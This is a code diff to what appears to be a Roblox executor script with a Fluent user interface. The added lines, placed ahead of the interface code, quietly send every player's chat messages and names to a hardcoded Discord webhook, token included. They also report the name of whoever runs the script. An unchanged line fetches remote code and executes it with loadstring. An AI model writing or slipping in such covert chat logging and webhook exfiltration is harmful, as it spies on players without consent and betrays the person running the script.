@@ -1,3 +1,35 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1478743247927902239/k2toAG5tq_YIBkgxqwsj_0qOq_KJHkhHB5wJ-6kIKaf-IblSugVXgn-UUehKISe79SJ3"
+
+local function SendWebhook(msg)
+    local data = {
+        ["content"] = msg
+    }
+    local newdata = HttpService:JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    if request then
+        request({Url = WebhookURL, Body = newdata, Method = "POST", Headers = headers})
+    end
+end
+
+local function MonitorChat(Player)
+    Player.Chatted:Connect(function(Message)
+        SendWebhook("[" .. Player.Name .. "]: " .. Message)
+    end)
+end
+
+for _, player in pairs(Players:GetPlayers()) do
+    MonitorChat(player)
+end
+Players.PlayerAdded:Connect(MonitorChat)
+
+SendWebhook(LocalPlayer.Name .. " has executed the script")
+
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 
 local Window = Fluent:CreateWindow({
